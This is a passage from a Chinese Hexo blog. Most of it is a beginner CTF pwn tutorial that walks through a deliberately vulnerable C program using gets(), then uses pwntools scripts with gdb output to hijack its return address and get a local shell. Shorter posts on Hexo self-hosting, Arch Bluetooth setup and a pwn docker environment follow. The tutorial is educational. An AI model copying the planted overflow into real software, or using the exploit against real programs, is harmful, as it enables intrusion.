<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc a.c -o pwn</span><br><span class="line">.&#x2F;pwn</span><br><span class="line">asdfasdfasdfadsjfasdkjfsd</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">fAborted (core dumped)</span><br></pre></td></tr></table></figure>

<p>执行输入超过15个字符就会发现, 不会执行到printf(“no error\n”)函数, 这就是所谓的堆栈溢出漏洞, 那么有时候开发不小心的时候就会造成这种漏洞.我再来个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void vul() &#123;</span><br><span class="line">        char arr[16];</span><br><span class="line">        gets(arr);</span><br><span class="line">&#125;</span><br><span class="line">void target() &#123;</span><br><span class="line">        system(&quot;sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">        vul();</span><br><span class="line">        printf(&quot;no error\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pwn的最终目标都是能够拥有控制权,也就是获得shell, 若我们能够通过输入劫持到target()函数, 那么我们就成功利用了该漏洞劫持程序流程到我们想要执行的代码部分, 也就是执行system函数获得shell.</p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc --no-stack-protector -no-pie a.c -o pwn</span><br><span class="line">.&#x2F;pwn</span><br></pre></td></tr></table></figure>

<p>使用python 写一下exp试试, 如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;pwn&#39;) # 在本地打开程序</span><br><span class="line"></span><br><span class="line">p &#x3D; b&#39;A&#39; * 15  # 构造payload为15个b&#39;A&#39;</span><br><span class="line">sh.sendline(p) # 发送payload</span><br><span class="line"></span><br><span class="line">sh.interactive() # 与程序进行交互</span><br></pre></td></tr></table></figure>

<p>保存为a.py, 执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 a.py </span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[logan@arch ~]$ </span><br><span class="line">[+] Starting local process &#39;.&#x2F;pwn&#39;: pid 44257</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#39;.&#x2F;pwn&#39; stopped with exit code 0 (pid 44257)</span><br><span class="line">no error</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>

<p>可以发现, 程序正常退出, 既然存在堆栈溢出漏洞, 我们要如何劫持程序流程呢, 那我们只有我们修改寄存器rip就可以实现任意地址执行了,那么就要的了解一下堆栈结构, 当程序调用一个新的函数时, 将会将当前的rip执行到的地址压入堆栈储存起来, 方便函数执行完后在回到原来的执行位置,若我们可以修改这个值, 在执行完函数后就实现了修改rip, 指令就是ret, ret指令相当与pop rip.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rsp---&gt;+-----------------+</span><br><span class="line">       |      buffer     |</span><br><span class="line">       +-----------------+</span><br><span class="line">       |      ......     |</span><br><span class="line">       +-----------------+</span><br><span class="line">       |      buffer     |</span><br><span class="line">       +-----------------+</span><br><span class="line">       |   last func rbp |</span><br><span class="line">rbp---&gt;+-----------------+</span><br><span class="line">       |     ret addr    |</span><br><span class="line">       +-----------------+</span><br></pre></td></tr></table></figure>

<p>我们用gdb来调试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg stack </span><br><span class="line">00:0000│ rax r8 rsp**  0x7fffffffe5a0 ◂— 0x41414141 &#x2F;* &#39;AAAA&#39; *&#x2F; </span><br><span class="line">01:0008│       0x7fffffffe5a8 —▸ 0x401060 (_start) ◂— endbr64  </span><br><span class="line">02:0010│ rbp     0x7fffffffe5b0 —▸ 0x7fffffffe5c0 —▸ 0x4011a0 (__libc_csu_init) ◂— endbr64  </span><br><span class="line">03:0018│       0x7fffffffe5b8 —▸ 0x401183 (main+14) ◂— lea   rdi, [rip + 0xe7d]</span><br></pre></td></tr></table></figure>

<p>上面我只输入了4个’A’, 若能够构造一个payload覆盖到rbp + 8处, 就可以实现劫持了, 输入24个’A’, 为啥是24呢, 数组长度为16, 然而rbp地址空间长度为8, 要溢出到ret地址, 就事先就输入24个字符。然后再输入8个’B覆盖ret 地址试试, 结果如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> RIP  0x401161 (vul+27) ◂— ret    </span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x401152 &lt;vul+12&gt;    mov    rdi, rax</span><br><span class="line">   0x401155 &lt;vul+15&gt;    mov    eax, 0</span><br><span class="line">   0x40115a &lt;vul+20&gt;    call   gets@plt &lt;0x401050&gt;</span><br><span class="line"> </span><br><span class="line">   0x40115f &lt;vul+25&gt;    nop    </span><br><span class="line">   0x401160 &lt;vul+26&gt;    leave  </span><br><span class="line"> ► 0x401161 &lt;vul+27&gt;    ret    &lt;0x4242424242424242&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以发现, 当执行ret指令时, 我们已经吧rip改成了0x4242424242424242</p>
<p>而0x42是字符’B’的储存值,若我们想要实现修改为0x01或者其他不可打印的字符, 那么手动是没法输入的, 那只能借用脚本,  将我们第一个使用的exp修改一下, 如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;pwn&#39;) # 在本地打开程序</span><br><span class="line"></span><br><span class="line">p &#x3D; b&#39;A&#39; * 24  # 构造payload</span><br><span class="line">p +&#x3D; b&#39;\x12\x34\x56\x78&#39; # 地址中储存高位在左, 内存中储存会为0x78563412</span><br><span class="line">gdb.attach(sh)  # gdb调试</span><br><span class="line">sh.sendline(p) # 发送payload</span><br><span class="line"></span><br><span class="line">sh.interactive() # 与程序进行交互</span><br></pre></td></tr></table></figure>

<p>我们执行看看, 是否rip 修改为0x78563412呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> RBP  0x4141414141414141 (&#39;AAAAAAAA&#39;) </span><br><span class="line"> RSP  0x7fff64449e20 ◂— 0x0 </span><br><span class="line"> RIP  0x78563412 </span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────── </span><br><span class="line">Invalid address 0x78563412</span><br></pre></td></tr></table></figure>

<p>果真修改为我们预期的结果</p>
<p>我们使用objdump指令获取target函数的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objdump -S pwn | grep target</span><br><span class="line">0000000000401162 &lt;target&gt;:</span><br></pre></td></tr></table></figure>

<p>那么如果我们将rip修改为0x401162, 即可实现跳转到目标函数</p>
<p>修改exp如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;pwn&#39;) # 在本地打开程序</span><br><span class="line">p &#x3D; b&#39;A&#39; * 24  # 构造payload</span><br><span class="line">p +&#x3D; b&#39;\x62\x11\x40\x00\x00\x00\x00\x00&#39; # 0x401162</span><br><span class="line">gdb.attach(sh)  # gdb调试</span><br><span class="line">sh.sendline(p) # 发送payload</span><br><span class="line"></span><br><span class="line">sh.interactive() # 与程序进行交互</span><br></pre></td></tr></table></figure>



<h3 id="调试运行"><a href="#调试运行" class="headerlink" title="调试运行"></a>调试运行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*RIP  0x401162 (target) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x40115f &lt;vul+25&gt;       nop    </span><br><span class="line">   0x401160 &lt;vul+26&gt;       leave  </span><br><span class="line">   0x401161 &lt;vul+27&gt;       ret    </span><br><span class="line"> </span><br><span class="line"> ► 0x401162 &lt;target&gt;       push   rbp</span><br><span class="line">   0x401163 &lt;target+1&gt;     mov    rbp, rsp</span><br><span class="line">   0x401166 &lt;target+4&gt;     lea    rdi, [rip + 0xe97]</span><br><span class="line">   0x40116d &lt;target+11&gt;    call   system@plt &lt;system@plt&gt;</span><br></pre></td></tr></table></figure>

<p>看到现在就运行到了target函数中, 那么就成功劫持了程序流程.好了最终exp如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;pwn&#39;) # 在本地打开程序</span><br><span class="line"></span><br><span class="line">p &#x3D; b&#39;A&#39; * 24  # 构造payload</span><br><span class="line">p +&#x3D; p64(0x401162) # target函数地址</span><br><span class="line"># p64函数会将数值转化为8字节的字符串&#39;\x62\x11\x40\x00\x00\x00\x00\x00&#39;</span><br><span class="line">sh.sendline(p) # 发送payload</span><br><span class="line"></span><br><span class="line">sh.interactive() # 与程序进行交互</span><br></pre></td></tr></table></figure>

<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:"></a>运行结果:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[logan@arch share]$ python a.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;pwn&#39;: pid 45513</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ date</span><br><span class="line">Sat 12 Sep 2020 09:25:17 PM CST</span><br></pre></td></tr></table></figure>



<h2 id="0x5-常用网站推荐"><a href="#0x5-常用网站推荐" class="headerlink" title="0x5 常用网站推荐"></a>0x5 常用网站推荐</h2><p>若以上你能正确调试与利用成功,  那你已经开始入门了, 你需要学习更多的知识了.以下网站是我及其推荐的.</p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/">ctf-wiki</a> : pwn的详细学习路线</p>
<p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">攻防世界 </a> : 从入门到高手的刷题网站与国内比赛平台</p>
<p><a target="_blank" rel="noopener" href="https://buuoj.cn/notifications">buuctf</a> : 刷不完的pwn题网站</p>
<p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/index">ctf-hub</a> : 时刻关注各个赛事</p>
<p><a target="_blank" rel="noopener" href="https://ctftime.org/">ctf-time</a>: 时刻关注国外赛事</p>
<p><a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database</a>: 查询libc版本网站</p>
<p><a target="_blank" rel="noopener" href="http://i0gan.cn/">i0gan</a> :  本人我的blog, 多多关注其他人的博客, 可以学到很多有用的知识 ^_^</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/12/pwn-for-beginner/" data-id="ckhemv80y001cwdcmcv5wb4m9" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-setup-hexo-blog-on-server" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/11/setup-hexo-blog-on-server/" class="article-date">
  <time datetime="2020-09-11T11:37:05.000Z" itemprop="datePublished">2020-09-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/hexo/">hexo</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/11/setup-hexo-blog-on-server/">在自己的服务器上搭建hexo blog</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="在自己的服务器上搭建hexo-blog"><a href="#在自己的服务器上搭建hexo-blog" class="headerlink" title="在自己的服务器上搭建hexo blog"></a>在自己的服务器上搭建hexo blog</h1><p>本教程基于会在github上搭建移植到自己的服务器中</p>
<p>必备:</p>
<p>nginx</p>
<p>git</p>
<p>nodejs</p>
<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd git</span><br><span class="line">passwd git</span><br></pre></td></tr></table></figure>

<p>vim /etc/sudoers</p>
<p>找到root ALL=(ALL) ALL，在它下方加入一行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git ALL&#x3D;(ALL) ALL</span><br></pre></td></tr></table></figure>



<h2 id="给git用户添加ssh密钥"><a href="#给git用户添加ssh密钥" class="headerlink" title="给git用户添加ssh密钥"></a>给git用户添加ssh密钥</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su - git</span><br><span class="line">mkdir -p ~&#x2F;.ssh</span><br><span class="line">touch ~&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chmod 600 ~&#x2F;.ssh&#x2F;authorzied_keys</span><br><span class="line">chmod 700 ~&#x2F;.ssh</span><br><span class="line">vim ~&#x2F;.ssh&#x2F;authorized_keys    #将本地生成ssh密钥粘贴进去</span><br></pre></td></tr></table></figure>



<h2 id="创建git仓库并使用git-hooks实现自动部署"><a href="#创建git仓库并使用git-hooks实现自动部署" class="headerlink" title="创建git仓库并使用git-hooks实现自动部署"></a>创建git仓库并使用git-hooks实现自动部署</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p &#x2F;var&#x2F;repo    #新建目录，这是git仓库的位置</span><br><span class="line">sudo mkdir pp &#x2F;var&#x2F;www&#x2F;hexo</span><br><span class="line">cd &#x2F;var&#x2F;repo  #转到git仓库的文件夹</span><br><span class="line">sudo git init --bare blog.git #创建一个名叫blog的仓库</span><br><span class="line">sudo vim &#x2F;var&#x2F;repo&#x2F;blog.git&#x2F;hooks&#x2F;post-update</span><br></pre></td></tr></table></figure>

<p><code>post-update</code>的内如如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">git --work-tree&#x3D;&#x2F;var&#x2F;www&#x2F;hexo --git-dir&#x3D;&#x2F;var&#x2F;repo&#x2F;blog.git checkout -f</span><br></pre></td></tr></table></figure>

<p><strong>给post-update授权</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;repo&#x2F;blog.git&#x2F;hooks&#x2F;</span><br><span class="line">sudo chown -R git:git &#x2F;var&#x2F;repo&#x2F;</span><br><span class="line">sudo chown -R git:git &#x2F;var&#x2F;www&#x2F;hexo</span><br><span class="line">sudo chmod +x post-update  #赋予其可执行权限</span><br></pre></td></tr></table></figure>



<h2 id="配置nginx"><a href="#配置nginx" class="headerlink" title="配置nginx"></a>配置nginx</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;nginx&#x2F;conf.d</span><br><span class="line">vim blog.conf</span><br></pre></td></tr></table></figure>

<p><code>blog.conf</code>的内如如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen    80 default_server;</span><br><span class="line">    listen    [::] default_server;</span><br><span class="line">    server_name    blog.59devops.com;</span><br><span class="line">    root    &#x2F;var&#x2F;www&#x2F;hexo</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查Nginx语法并重载nginx：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx -t</span><br><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>



<h2 id="修改git用户的默认shell环境"><a href="#修改git用户的默认shell环境" class="headerlink" title="修改git用户的默认shell环境"></a>修改git用户的默认shell环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;passwd</span><br><span class="line">#修改最后一行</span><br><span class="line">#将&#x2F;bin&#x2F;bash修改为&#x2F;usr&#x2F;bin&#x2F;git-shell</span><br></pre></td></tr></table></figure>



<h2 id="本地hexo-配置"><a href="#本地hexo-配置" class="headerlink" title="本地hexo 配置"></a>本地hexo 配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim _config.yml</span><br><span class="line"></span><br><span class="line"># 找到deploy配置部分</span><br><span class="line"># Deployment</span><br><span class="line">## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.html</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@xxx.xx.xxx.xxx:&#x2F;var&#x2F;repo&#x2F;blog.git # IP填写自己服务器的IP即可</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/11/setup-hexo-blog-on-server/" data-id="ckhemv811001ewdcmaxbu282c" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-linux-install-bluetooth" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/11/linux-install-bluetooth/" class="article-date">
  <time datetime="2020-09-11T04:10:33.000Z" itemprop="datePublished">2020-09-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/11/linux-install-bluetooth/">linux-install-bluetooth</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Arch-Install-Buletooth"><a href="#Arch-Install-Buletooth" class="headerlink" title="Arch Install Buletooth"></a>Arch Install Buletooth</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S bluez bluez-utils bluedevil</span><br><span class="line">systemctl <span class="built_in">enable</span> bluetooth</span><br></pre></td></tr></table></figure>

<p>其中bluedevil为图形化管理工具。</p>
<p>重启后可在托盘看到图标。</p>
<p>如果要用蓝牙耳机，或者蓝牙音响，还需要安装pulseaudio-bluetooth</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S pulseaudio-bluetooth </span><br></pre></td></tr></table></figure>

<p>这个程序默认开机启动。但经常发生开机后能连接音响，却不是用音响输出声音的情况。</p>
<p>执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pulseaudio -k</span><br><span class="line">$ pulseaudio --start</span><br></pre></td></tr></table></figure>

<p>再打开音频或者视频就能从蓝牙音响输出了。</p>
<p>后面这两个位置是参考别人的，不懂什么原因。</p>
<p>（可能有用，可能没用，最好添加下）</p>
<ol>
<li>General下添加一句：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable=Source,Sink,Media,Socket</span><br></pre></td></tr></table></figure>

<ol>
<li><code>vim /etc/pulse.default.pa</code>下添加（可能有用，可能没用，最好添加下）</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load-module module-bluetooth-discover</span><br><span class="line">module-bluetooth-policy</span><br><span class="line">module-bluez5-device</span><br><span class="line">module-bluez5-discover</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/11/linux-install-bluetooth/" data-id="ckhemv80l000xwdcm0nr690mu" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-pwn-docker-env" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/11/pwn-docker-env/" class="article-date">
  <time datetime="2020-09-10T16:15:05.000Z" itemprop="datePublished">2020-09-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/11/pwn-docker-env/">pwn docker env build</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Pwn-Docker环境搭建"><a href="#Pwn-Docker环境搭建" class="headerlink" title="Pwn Docker环境搭建"></a>Pwn Docker环境搭建</h1><p>之前一直都是在ubuntu14 ~ ubuntu18虚拟机中进行调试, 若不是常见的libc就比较麻烦,而且虚拟机安装后比较占磁盘还有管理不太方便, 环境有时候崩溃的话,就比较再次难以搭建, 为了解决以上问题, pwn docker完美解决, 且提供了大量ctf pwn工具, 以python3来进行脚本编写, 更加符合目前的pwn演变趋势….</p>
<h2 id="包含的软件"><a href="#包含的软件" class="headerlink" title="包含的软件"></a>包含的软件</h2><ul>
<li>pwntools —— CTF framework and exploit development library</li>
<li>gdb-peda —— Python Exploit Development Assistance for GDB</li>
<li>Pwngdb —— GDB for pwn</li>
<li>ROPgadget —— facilitate ROP exploitation tool</li>
<li>roputils —— A Return-oriented Programming toolkit</li>
<li>linux_server[x64] —— IDA 6.8 debug server for linux</li>
<li>tmux —— a terminal multiplexer</li>
<li>ltrace —— trace library function call</li>
<li>strace —— trace system call</li>
</ul>
<h2 id="github"><a href="#github" class="headerlink" title="github"></a>github</h2><p><a target="_blank" rel="noopener" href="https://github.com/shenyuan123/pwndocker">https://github.com/shenyuan123/pwndocker</a></p>
<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>Docker hub地址：<a target="_blank" rel="noopener" href="https://hub.docker.com/r/skysider/pwndocker/">https://hub.docker.com/r/skysider/pwndocker/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider&#x2F;pwndocker</span><br></pre></td></tr></table></figure>



<h2 id="创建docker-网络"><a href="#创建docker-网络" class="headerlink" title="创建docker 网络"></a>创建docker 网络</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker network create-subnet&#x3D;192.168.222.0&#x2F;24docker_net</span><br></pre></td></tr></table></figure>



<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name&#x3D;pwn --net docker_net skysider&#x2F;pwndocker bash</span><br></pre></td></tr></table></figure>





<h2 id="编写docker-pwn-启动管理脚本"><a href="#编写docker-pwn-启动管理脚本" class="headerlink" title="编写docker pwn 启动管理脚本"></a>编写docker pwn 启动管理脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;bash</span><br><span class="line"># author: i0gan</span><br><span class="line">if [[ $1 &#x3D;&#x3D; &#39;init&#39; ]];then</span><br><span class="line">	sudo docker run --network&#x3D;host -d --name&#x3D;pwn -v &#x2F;home&#x2F;logan&#x2F;share:&#x2F;ctf&#x2F;work skysider&#x2F;pwndocker</span><br><span class="line">elif [[ $1 &#x3D;&#x3D; &#39;exec&#39; ]];then</span><br><span class="line">	sudo docker exec -it pwn bash</span><br><span class="line">elif [[ $1 &#x3D;&#x3D; &#39;start&#39; ]];then</span><br><span class="line">	sudo docker start pwn</span><br><span class="line">elif [[ $1 &#x3D;&#x3D; &#39;stop&#39; ]];then</span><br><span class="line">	sudo docker stop pwn</span><br><span class="line">else</span><br><span class="line">	echo &quot;nothing to do&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>



<h2 id="配置源"><a href="#配置源" class="headerlink" title="配置源"></a>配置源</h2><p>备份源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bk</span><br></pre></td></tr></table></figure>

<p>将一下内容覆盖到/etc/apt/sources.list中</p>
